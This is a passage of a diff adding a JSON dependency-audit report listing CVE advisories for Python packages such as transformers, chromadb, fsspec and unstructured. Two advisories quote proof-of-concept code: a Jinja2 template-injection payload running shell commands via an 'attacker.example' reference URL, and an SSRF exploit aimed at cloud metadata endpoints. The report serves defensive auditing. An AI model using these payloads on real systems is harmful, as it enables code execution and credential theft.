canonical form before matching, in both `setuptools/command/egg_info.py` (`FileList`) and the vendored `setuptools/_distutils/filelist.py`. For an exclusion list, err toward excluding more, and document that `MANIFEST.in` matching is normalization-insensitive on macOS.  ## Credit  Reported by Tomas Illuminati. Coordinated via CERT/CC VINCE VU#604762."
+						}
+					]
+				},
+				{
+					"name": "torch",
+					"version": "2.12.1",
+					"vulns": [
+						{
+							"id": "PYSEC-2025-194",
+							"fix_versions": ["2.13.0"],
+							"aliases": ["CVE-2025-3000", "GHSA-rrmf-rvhw-rf47", "BIT-pytorch-2025-3000"],
+							"description": "A vulnerability classified as critical has been found in PyTorch 2.6.0. This affects the function torch.jit.script. The manipulation leads to memory corruption. It is possible to launch the attack on the local host. The exploit has been disclosed to the public and may be used."
+						}
+					]
+				},
+				{
+					"name": "transformers",
+					"version": "5.5.4",
+					"vulns": [
+						{
+							"id": "PYSEC-2026-3929",
+							"fix_versions": ["5.10.0"],
+							"aliases": ["GHSA-xrqw-3rrv-vx5w", "CVE-2026-9856"],
+							"description": "A vulnerability in huggingface/transformers versions < 5.10.0 allows an attacker to perform arbitrary file writes via path traversal. The issue resides in the `save_pretrained()` methods of `PreTrainedTokenizerBase` and `ProcessorMixin`, where keys from the `chat_template` dictionary are used directly as filenames without proper validation. An attacker can exploit this by publishing a malicious Hugging Face Hub repository with a crafted `tokenizer_config.json` file. When a victim downloads and saves the tokenizer or processor, the attacker-controlled keys can escape the intended save directory, enabling arbitrary file writes with attacker-controlled content. This vulnerability affects multiple processors inheriting from `ProcessorMixin`, including Idefics, Florence, Gemma, Phi, and Qwen-VL."
+						},
+						{
+							"id": "PYSEC-2026-4174",
+							"fix_versions": [],
+							"aliases": ["GHSA-x9r9-c232-4q39", "CVE-2026-80047"],
+							"description": "A vulnerability in Hugging Face Transformers (versions 4.49.0, <= 5.8.1) allows remote Python files to be written to local disk without user consent when using GenerativePreTrainedModel.load_custom_generate(). The function fetches and caches a remote module file before performing the required trust_remote_code consent check, inverting the security model enforced by other code-loading paths (such as AutoConfig, AutoModel, and AutoTokenizer). As a result, attacker\u2011controlled Python code from custom_generate/generate.py is copied into the user\u2019s ~/.cache/huggingface/modules directory even if the user declines the trust prompt. Although execution is correctly gated, the file write is not reversible and can persist across sessions. This can lead to persistent, unauthorized files on disk and stale cache collisions where cached attacker code may later be executed during trusted model loads. The issue stems from an unconditional file write in dynamic_module_utils.py prior to any trust verification."
+						}
+					]
+				}
+			]
+		},
+		"resolved-python": {
+			"distributions": 333,
+			"affected_packages": 8,
+			"advisory_entries": 14,
+			"packages": [
+				{
+					"name": "accelerate",
+					"version": "1.13.0",
+					"vulns": [
+						{
+							"id": "PYSEC-2026-3804",
+							"fix_versions": [],
+							"aliases": ["CVE-2026-69112", "GHSA-4j2p-28q2-5m79"],
+							"description": "Hugging Face Accelerate through 1.14.0 contains a path traversal vulnerability in load_checkpoint_in_model and load_checkpoint_and_dispatch functions that fail to sanitize weight_map entries from sharded checkpoint indexes. Attackers can supply relative paths with ../ sequences or absolute paths to read arbitrary files, or point shard entries at named pipes to cause indefinite blocking and denial of service."
+						}
+					]
+				},
+				{
+					"name": "chromadb",
+					"version": "1.5.9",
+					"vulns": [
+						{
+							"id": "PYSEC-2026-311",
+							"fix_versions": [],
+							"aliases": ["CVE-2026-45829", "GHSA-f4j7-r4q5-qw2c"],
+							"description": "A pre-authentication, code injection vulnerability in version 1.0.0 or later of the ChromaDB Python project allows an unauthenticated attacker to run arbitrary code on the server by sending a malicious model repository and trust_remote_code set to true in the\u00a0/api/v2/tenants/{tenant}/databases/{db}/collections endpoint."
+						},
+						{
+							"id": "PYSEC-2026-311",
+							"fix_versions": [],
+							"aliases": ["CVE-2026-45829", "GHSA-f4j7-r4q5-qw2c"],
+							"description": "A pre-authentication, code injection vulnerability in version 1.0.0 or later of the ChromaDB Python project allows an unauthenticated attacker to run arbitrary code on the server by sending a malicious model repository and trust_remote_code set to true in the\u00a0/api/v2/tenants/{tenant}/databases/{db}/collections endpoint."
+						},
+						{
+							"id": "PYSEC-2026-3814",
+							"fix_versions": [],
+							"aliases": ["GHSA-36p7-vc44-83pf", "CVE-2026-45833"],
+							"description": "A code injection vulnerability in version 0.4.17 or later of the ChromaDB Python project allows an authenticated attacker to run arbitrary code on the server by sending a malicious model repository and trust_remote_code set to true in the\u00a0/api/v2/tenants/default_tenant/databases/default_database/collections/{collection_id} if they have the UPDATE_COLLECTION permission."
+						},
+						{
+							"id": "PYSEC-2026-3815",
+							"fix_versions": [],
+							"aliases": ["CVE-2026-45831", "GHSA-xph7-9rjv-w5fr"],
+							"description": "The SimpleRBACAuthorizationProvider authorization provider in versions 0.5.0 or later of the ChromaDB Python project evaluates whether a user holds a given permission but never checks which tenant, database, or collection that permission applies to allowing users to perform cross tenant actions."
+						},
+						{
+							"id": "PYSEC-2026-3813",
+							"fix_versions": [],
+							"aliases": ["CVE-2026-45830", "GHSA-2wm9-hf6c-p5cr"],
+							"description": "A lack of authorization validation in version 0.4.17 or later of the ChromaDB Python project allows any authenticated users to arbitrarily read, write, update, or delete data in any tenant's collection regardless of which tenant they belong to."
+						}
+					]
+				},
+				{
+					"name": "datasets",
+					"version": "4.0.0",
+					"vulns": [
+						{
+							"id": "PYSEC-2026-3716",
+							"fix_versions": ["5.0.1"],
+							"aliases": ["GHSA-379c-qx7v-6h59", "CVE-2026-66007"],
+							"description": "Datasets through 5.0.0, fixed in commit f989ef9, contains a path traversal vulnerability in folder-based dataset builders where the file_name metadata field is not properly validated before being joined to the dataset directory. Attackers can supply crafted file_name values with directory traversal sequences to read arbitrary local files, which are then embedded into output when save_to_disk or push_to_hub is called."
+						}
+					]
+				},
+				{
+					"name": "fsspec",
+					"version": "2025.3.0",
+					"vulns": [
+						{
+							"id": "CVE-2026-104851",
+							"fix_versions": ["2026.6.0"],
+							"aliases": ["GHSA-27vj-qcqg-25rc"],
+							"description": "### Summary  `fsspec.implementations.reference.ReferenceFileSystem` parses a \"references\" JSON document (Kerchunk format) supplied either inline or via a URL. The parser renders fields from this JSON through **un-sandboxed** `jinja2.Template(...).render(...)` calls in three locations. An attacker who controls the JSON document \u2014 typically by hosting it at a URL that the victim opens with `fsspec.filesystem(\"reference\", fo=URL)` or via `xarray.open_dataset(\"reference://...\")` \u2014 achieves arbitrary Python code execution on the victim machine, before any data is read.  This mirrors the pattern of [CVE-2024-34359](https://nvd.nist.gov/vuln/detail/CVE-2024-34359) in `llama-cpp-python`, where externally-sourced template strings were rendered with the default unrestricted Jinja2 environment.  ### Affected versions  All versions of `fsspec` from `0.9.0` onward (vulnerable code introduced in commit `0fb8d56b684ee74ad9ad4587fd560bde1b116450`, 2021-03-12). Confirmed on the latest released version `2025.10.0`.  ### Affected sinks  All in `fsspec/implementations/reference.py`:  | Sink | Location | Trigger | |---|---|---| | A \u2014 `_process_references1._render_jinja` | lines 1016-1018 | `simple_templates=False` and a `refs` entry contains `{{` | | B \u2014 `_process_templates` (lambda) | lines 1043-1053 | `templates` dict has values containing `{{`, invoked later via render context | | C \u2014 `_process_gen` | lines 1075-1083 | references JSON contains a `gen` array (always reached, regardless of `simple_templates`) |  Sink C is the most severe: it is reached unconditionally for any references JSON that includes a `gen` field.  The vulnerable code:  ```python # fsspec/implementations/reference.py # Sink A @lru_cache(1000) def _render_jinja(u):     return jinja2.Template(u).render(**self.templates)  # <- unsandboxed  # Sink B def _process_templates(self, tmp):     ...     for k, v in tmp.items():         if \"{{\" in v:             import jinja2             self.templates[k] = lambda temp=v, **kwargs: jinja2.Template(                 temp                                       # <- unsandboxed             ).render(**kwargs)  # Sink C def _process_gen(self, gens):     ...     for pr in products:         import jinja2         key = jinja2.Template(gen[\"key\"]).render(**pr, **self.templates)        # <- unsandboxed         url = jinja2.Template(gen[\"url\"]).render(**pr, **self.templates)        # <- unsandboxed         if (\"offset\" in gen) and (\"length\" in gen):             offset = int(jinja2.Template(gen[\"offset\"]).render(...))            # <- unsandboxed             length = int(jinja2.Template(gen[\"length\"]).render(...))            # <- unsandboxed ```  ### Proof of concept (Sink C, minimal)  Save as `poc.py`:  ```python import http.server, json, socketserver, threading, time, fsspec from pathlib import Path  PAYLOAD = \"{{ joiner.__init__.__globals__.os.popen('touch /tmp/fsspec_pwned_$(whoami)').read() }}\" REF = {     \"version\": 1, \"templates\": {}, \"refs\": {\"x\": \"x\"},     \"gen\": [{         \"key\": PAYLOAD + \"/{{ i }}\", \"url\": \"http://example.com/{{ i }}\",         \"offset\": \"0\", \"length\": \"0\", \"dimensions\": {\"i\": [0]},     }], }  body = json.dumps(REF).encode() class H(http.server.BaseHTTPRequestHandler):     def do_GET(self):         self.send_response(200); self.end_headers(); self.wfile.write(body)     def log_message(self, *a, **kw): pass  srv = socketserver.TCPServer((\"127.0.0.1\", 0), H) threading.Thread(target=srv.serve_forever, daemon=True).start() url = f\"http://127.0.0.1:{srv.server_address[1]}/refs.json\"  for p in Path(\"/tmp\").glob(\"fsspec_pwned_*\"): p.unlink() try:     fsspec.filesystem(\"reference\", fo=url) except Exception as e:     print(\"exception:\", e) srv.shutdown() time.sleep(0.3) print(\"markers:\", list(Path(\"/tmp\").glob(\"fsspec_pwned_*\"))) ```  Run:  ``` pip install fsspec aiohttp requests jinja2 python3 poc.py # \u2192 markers: [PosixPath('/tmp/fsspec_pwned_<user>')] ```  ### End-to-end via xarray (real-world consumer pathway)  ```python import xarray as xr ds = xr.open_dataset(     \"reference://\",     engine=\"zarr\",     backend_kwargs={         \"consolidated\": False,         \"storage_options\": {             \"fo\": \"http://attacker.example/refs.json\",             \"remote_protocol\": \"http\",         },     }, ) # RCE fires before any data is materialised. ```  ### Tested on  - fsspec 2025.10.0, jinja2 3.1.6, Python 3.9, macOS 14 - fsspec 2025.10.0, jinja2 3.1.6, Python 3.12-slim, Docker Linux  ### Impact  `fsspec.ReferenceFileSystem` is the canonical entrypoint for the **Kerchunk** format, widely used in the Pangeo / Earth-observation / climate data-science ecosystem to provide cloud-optimised views of HDF5 / NetCDF / GRIB archives hosted on object storage.  Realistic attack vectors:  - A user opens a community-shared Kerchunk catalogue link via xarray/dask. - A managed data-science platform (notebook server, batch job runner)   ingests user-submitted Kerchunk URLs. - A workflow downloads a catalogue from a bucket whose contents have   been tampered with (supply chain).  In every case, the victim performs no action beyond opening a \"reference filesystem\" \u2014 there is no documented expectation that a data catalogue can execute arbitrary Python code.  ### Suggested fix  Replace `jinja2.Template(...)` with a shared `jinja2.sandbox.ImmutableSandboxedEnvironment` for all three sinks. This matches the post-incident hardening applied to `llama-cpp-python` after CVE-2024-34359.  ```python # At module top def _sandboxed_env():     import jinja2.sandbox     env = getattr(_sandboxed_env, \"_env\", None)     if env is None:         env = jinja2.sandbox.ImmutableSandboxedEnvironment()         _sandboxed_env._env = env     return env ```  Then in each sink, replace `jinja2.Template(s).render(...)` with `_sandboxed_env().from_string(s).render(...)`.  The legitimate Kerchunk template syntax (simple variable substitution like `{{ varname }}`) continues to work under the sandbox; only the SSTI gadgets (`__class__`, `__init__.__globals__`, `__subclasses__`, etc.) are refused with `jinja2.exceptions.SecurityError`.  A complete patch is available on request.  ### Credit  Reported by Dany.A"
+						}
+					]
+				},
+				{
+					"name": "pyarrow",
+					"version": "20.0.0",
+					"vulns": [
+						{
+							"id": "PYSEC-2026-113",
+							"fix_versions": ["23.0.1"],
+							"aliases": ["CVE-2026-25087", "GHSA-rgxp-2hwp-jwgg"],
+							"description": "Use After Free vulnerability in Apache Arrow C++.  This issue affects Apache Arrow C++ from 15.0.0 through 23.0.0. It can be triggered when reading an Arrow IPC file (but not an IPC stream) with pre-buffering enabled, if the IPC file contains data with variadic buffers (such as Binary View and String View data). Depending on the number of variadic buffers in a record batch column and on the temporal sequence of multi-threaded IO, a write to a dangling pointer could occur. The value (a `std::shared_ptr<Buffer>` object)\u00a0that is written to the dangling pointer is not under direct control of the attacker.  Pre-buffering is disabled by default but can be enabled using a specific C++ API call (`RecordBatchFileReader::PreBufferMetadata`). The functionality is not exposed in language bindings (Python, Ruby, C GLib), so these bindings are not vulnerable.  The most likely consequence of this issue would be random crashes or memory corruption when reading specific kinds of IPC files. If the application allows ingesting IPC files from untrusted sources, this could plausibly be exploited for denial of service. Inducing more targeted kinds of misbehavior (such as confidential data extraction from the running process) depends on memory allocation and multi-threaded IO temporal patterns that are unlikely to be easily controlled by an attacker.  Advice for users of Arrow C++:  1. check whether you enable pre-buffering on the IPC file reader (using\u00a0`RecordBatchFileReader::PreBufferMetadata`)   2. if so, either disable pre-buffering (which may have adverse performance consequences), or switch to Arrow 23.0.1 which is not vulnerable"
+						},
+						{
+							"id": "PYSEC-2026-113",
+							"fix_versions": ["23.0.1"],
+							"aliases": ["CVE-2026-25087", "GHSA-rgxp-2hwp-jwgg"],
+							"description": "Use After Free vulnerability in Apache Arrow C++.  This issue affects Apache Arrow C++ from 15.0.0 through 23.0.0. It can be triggered when reading an Arrow IPC file (but not an IPC stream) with pre-buffering enabled, if the IPC file contains data with variadic buffers (such as Binary View and String View data). Depending on the number of variadic buffers in a record batch column and on the temporal sequence of multi-threaded IO, a write to a dangling pointer could occur. The value (a `std::shared_ptr<Buffer>` object)\u00a0that is written to the dangling pointer is not under direct control of the attacker.  Pre-buffering is disabled by default but can be enabled using a specific C++ API call (`RecordBatchFileReader::PreBufferMetadata`). The functionality is not exposed in language bindings (Python, Ruby, C GLib), so these bindings are not vulnerable.  The most likely consequence of this issue would be random crashes or memory corruption when reading specific kinds of IPC files. If the application allows ingesting IPC files from untrusted sources, this could plausibly be exploited for denial of service. Inducing more targeted kinds of misbehavior (such as confidential data extraction from the running process) depends on memory allocation and multi-threaded IO temporal patterns that are unlikely to be easily controlled by an attacker.  Advice for users of Arrow C++:  1. check whether you enable pre-buffering on the IPC file reader (using\u00a0`RecordBatchFileReader::PreBufferMetadata`)  2. if so, either disable pre-buffering (which may have adverse performance consequences), or switch to Arrow 23.0.1 which is not vulnerable"
+						}
+					]
+				},
+				{
+					"name": "sentence-transformers",
+					"version": "5.5.1",
+					"vulns": [
+						{
+							"id": "PYSEC-2026-4164",
+							"fix_versions": ["5.6.0"],
+							"aliases": ["GHSA-jhr6-gm9c-rqjv", "CVE-2026-68770"],
+							"description": "sentence-transformers contains a security control bypass vulnerability that allows attackers to achieve arbitrary code execution by exploiting a logic flaw in the import_module_class helper within sentence_transformers/util/misc.py, where the guard condition includes an 'or os.path.exists(model_name_or_path)' clause that satisfies the trust gate whenever the supplied path exists on the local filesystem, regardless of the trust_remote_code=False argument. Attackers who can control or influence the contents of a model directory on disk can place malicious Python files such as modeling_*.py referenced via modules.json, causing the code to execute at import time when an application loads the model with SentenceTransformer(path, trust_remote_code=False), bypassing the documented security contract and achieving code execution within the loading process."
+						}
+					]
+				},
+				{
+					"name": "transformers",
+					"version": "5.5.4",
+					"vulns": [
+						{
+							"id": "PYSEC-2026-3929",
+							"fix_versions": ["5.10.0"],
+							"aliases": ["GHSA-xrqw-3rrv-vx5w", "CVE-2026-9856"],
+							"description": "A vulnerability in huggingface/transformers versions < 5.10.0 allows an attacker to perform arbitrary file writes via path traversal. The issue resides in the `save_pretrained()` methods of `PreTrainedTokenizerBase` and `ProcessorMixin`, where keys from the `chat_template` dictionary are used directly as filenames without proper validation. An attacker can exploit this by publishing a malicious Hugging Face Hub repository with a crafted `tokenizer_config.json` file. When a victim downloads and saves the tokenizer or processor, the attacker-controlled keys can escape the intended save directory, enabling arbitrary file writes with attacker-controlled content. This vulnerability affects multiple processors inheriting from `ProcessorMixin`, including Idefics, Florence, Gemma, Phi, and Qwen-VL."
+						},
+						{
+							"id": "PYSEC-2026-4174",
+							"fix_versions": [],
+							"aliases": ["GHSA-x9r9-c232-4q39", "CVE-2026-80047"],
+							"description": "A vulnerability in Hugging Face Transformers (versions 4.49.0, <= 5.8.1) allows remote Python files to be written to local disk without user consent when using GenerativePreTrainedModel.load_custom_generate(). The function fetches and caches a remote module file before performing the required trust_remote_code consent check, inverting the security model enforced by other code-loading paths (such as AutoConfig, AutoModel, and AutoTokenizer). As a result, attacker\u2011controlled Python code from custom_generate/generate.py is copied into the user\u2019s ~/.cache/huggingface/modules directory even if the user declines the trust prompt. Although execution is correctly gated, the file write is not reversible and can persist across sessions. This can lead to persistent, unauthorized files on disk and stale cache collisions where cached attacker code may later be executed during trusted model loads. The issue stems from an unconditional file write in dynamic_module_utils.py prior to any trust verification."
+						}
+					]
+				},
+				{
+					"name": "unstructured",
+					"version": "0.22.31",
+					"vulns": [
+						{
+							"id": "PYSEC-2026-3930",
+							"fix_versions": ["0.24.0"],
+							"aliases": ["GHSA-4mvj-m6j5-pmf7", "CVE-2026-71428"],
+							"description": "### Summary  Server-Side Request Forgery in `unstructured`. The `url=` argument of `partition()`, `partition_html()`, and `partition_md()` is fetched via `requests.get()` with no host validation. The response body is returned as `Element` text, so this is a **full-read SSRF** \u2014 attackers reach loopback admin APIs, internal HTTP services, and cloud metadata endpoints, and read the response.   `unstructured` is the de facto URL ingestion layer for LangChain `UnstructuredURLLoader`, LlamaIndex `UnstructuredReader`, Chainlit, and many agent frameworks \u2014 secure defaults must live in the library, not in every downstream caller.  ### Details  Three sinks, all in `unstructured == 0.22.26` (verified on `main` at `199f255`):  - `unstructured/partition/auto.py:303` \u2014 `file_and_type_from_url()`, reached via `partition(url=\u2026)`. - `unstructured/partition/html/partition.py:160` \u2014 `partition_html(url=\u2026)`. Post-fetch `Content-Type` check runs after the request hits the target. - `unstructured/partition/md.py:96` \u2014 `partition_md(url=\u2026)`. No timeout (SSRF + slow-loris DoS).  None of `is_private`, `is_loopback`, `ipaddress`, `gethostbyname`, or `allow_redirects` appear in any of the three files. Three exploitation paths apply: direct private-IP target; redirect bypass (`allow_redirects=True` default); DNS rebinding (TOCTOU, closeable only by socket-pinning). Affected since `0.4.7` (Feb 2023) \u2014 ~219 releases, no validation ever introduced.  ### PoC  Local-only. `pip install unstructured==0.22.26 flask requests`.  `internal_server.py`:  ```python from flask import Flask, Response, jsonify app = Flask(__name__)  @app.route(\"/imds\") def imds(): return jsonify({\"AccessKeyId\": \"ASIA-FAKE\", \"SecretAccessKey\": \"FAKE/SECRET\"})  @app.route(\"/internal.html\") def html(): return Response(\"<html><body><p>SK_LEAK_42</p></body></html>\", mimetype=\"text/html\")  @app.route(\"/redir\") def redir(): return Response(\"\", 302, headers={\"Location\": \"http://127.0.0.1:9999/imds\"})  if __name__ == \"__main__\": app.run(host=\"127.0.0.1\", port=9999) ```  `exploit.py` \u2014 uses the public top-level API:  ```python # Stub NLP helpers so the offline sandbox skips spaCy model download. # Does NOT affect the SSRF (which lives in the URL fetcher, before NLP). import unstructured.nlp.tokenize as _tk, unstructured.partition.text_type as _tt _tk.sent_tokenize = _tt.sent_tokenize = lambda t: [s for s in (t or \"\").split(\". \") if s] _tk.word_tokenize = _tt.word_tokenize = lambda t: (t or \"\").split() _tk.pos_tag       = _tt.pos_tag       = lambda t: [(w, \"NN\") for w in (t or \"\").split()]  from unstructured.partition.auto import partition L = \"http://127.0.0.1:9999\"  # A: partition(url=...) leaks internal HTML body assert \"SK_LEAK_42\" in \"\\n\".join(str(e) for e in partition(url=f\"{L}/internal.html\", languages=[\"eng\"])) # B: redirect bypass reaches simulated IMDS assert \"SecretAccessKey\" in \"\\n\".join(str(e) for e in partition(url=f\"{L}/redir\", languages=[\"eng\"])) print(\"PoC OK\") ```  In production the attacker substitutes `169.254.169.254`, `metadata.google.internal`, or any internal address.  ### Impact  Attacker capabilities:  - **Internal HTTP service read** \u2014 loopback admin consoles, internal Elasticsearch/Redis/Consul/etcd HTTP fronts, Kubernetes API server, social/internal microservices. This is the most broadly exploitable capability and is unaffected by any cloud-side hardening. - **Cloud instance metadata access** \u2014 reads metadata services that respond to unauthenticated GETs: GCP (`metadata.google.internal`), Azure IMDS, Oracle Cloud, DigitalOcean, and EC2 instances still configured for IMDSv1 (which remains widely deployed in older accounts and in services that do not enforce IMDSv2-only). EC2 instances configured as IMDSv2-only are not exposed to direct credential theft via this SSRF, since IMDSv2 requires a `PUT` for token acquisition; the SSRF still reaches the endpoint for reconnaissance and surface-mapping. - **Side-effecting GET endpoints** \u2014 magic-link consumers, job triggers, link-preview generators reachable on internal networks. - **Internal network reconnaissance** \u2014 connection success/failure timing and error messages serve as a port and service scanner."
+						}
+					]
+				}
+			]
+		},
+		"semgrep": {
+			"entries": 85,
+			"severity": {
+				"MEDIUM": 5,
+				"WARNING": 59,
+				"ERROR": 21
+			},
+			"diagnostics": 9
+		},
+		"bandit": {
+			"entries": 205,
+			"severity": {
+				"MEDIUM": 51,
+				"LOW": 154
+			}
+		},
+		"git-secrets": {
+			"leaks": 0,
+			"shallow_history": true
+		}
+	},
+	"remediation": {
+		"date": "2026-10-14",
+		"report": "../SYSTEM_REVIEW_2026-10-14.md",
+		"status": "fixed_in_working_tree"
+	}
+}
